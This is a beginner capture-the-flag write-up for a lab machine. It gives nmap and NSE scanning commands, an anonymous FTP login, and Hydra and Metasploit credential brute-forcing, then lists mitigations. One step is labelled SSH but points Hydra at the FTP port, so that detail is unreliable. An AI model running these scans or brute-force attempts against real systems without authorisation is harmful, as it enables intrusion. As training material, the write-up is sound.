# CTF Writeup — HSBOX1

**Date:** 29 Apr 2026  
**Difficulty:** Beginner  
**Category:** Network Pentest  
**Objective:** Enumerate services, identify vulnerabilities, gain access

---

## Recon & Scanning

### Step 1 — Host Discovery
```bash
nmap 10.0.2.15
# Confirmed host is up
```

### Step 2 — Full Port Scan
```bash
nmap 10.0.2.15 -p-
# Found open ports beyond default top 1000
```

### Step 3 — Service Version + Script Scan
```bash
nmap 10.0.2.15 -p 21,1515,3535 -sV
# Port 21: FTP (version identified)
# Port 1515, 3535: custom services
```

### Step 4 — NSE Script Enumeration
```bash
# Find all NSE scripts available
find / -name *.nse
find / -name *.nse | grep ftp

# Check for anonymous FTP login
nmap -sS -T4 10.0.2.15 -sV -p 21 --script /usr/share/nmap/scripts/ftp-anon.nse
# Result: Anonymous FTP login ALLOWED

# Check for known FTP backdoors
nmap -sS -T4 10.0.2.15 --script ftp-proftpd-backdoor.nse -p 21
nmap -sS -T4 10.0.2.15 --script ftp-vsftpd-backdoor.nse -p 21
```

---

## Enumeration

### FTP Anonymous Login
```bash
ftp 10.0.2.15
# Username: anonymous
# Password: (blank or any email)
# Result: logged in successfully

ls -la          # list files
get <filename>  # download files
```

---

## Exploitation

### SSH Brute Force
```bash
# Using Hydra with wordlists
hydra -L /root/username.txt -P /root/password.txt 10.0.2.15 -s 21 ftp -V -t 2

# Using Metasploit SSH login scanner
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.2.15
set USER_FILE /root/username.txt
set PASS_FILE /root/password.txt
run
```

---

## Lessons Learned

1. **Always scan all ports** (`-p-`) — services hiding on non-standard ports are common
2. **NSE scripts are essential** — `ftp-anon` immediately revealed misconfiguration
3. **Anonymous FTP** is a critical misconfiguration — often leads to data exposure or foothold
4. **Wordlists matter** — quality of username/password lists directly impacts brute force success
5. **Layer your tools** — Nmap → Hydra → Metasploit gives multiple angles of attack

---

## Tools Used
- Nmap with NSE scripts
- Hydra (brute force)
- Metasploit Framework
- FTP client

---

## Mitigation (Blue Team Perspective)

| Finding | Fix |
|---------|-----|
| Anonymous FTP enabled | Disable anonymous login in FTP config |
| Weak SSH credentials | Enforce strong passwords + SSH key auth only |
| Outdated FTP service | Update to current patched version |
| Services on non-standard ports | Implement proper network segmentation + monitoring |
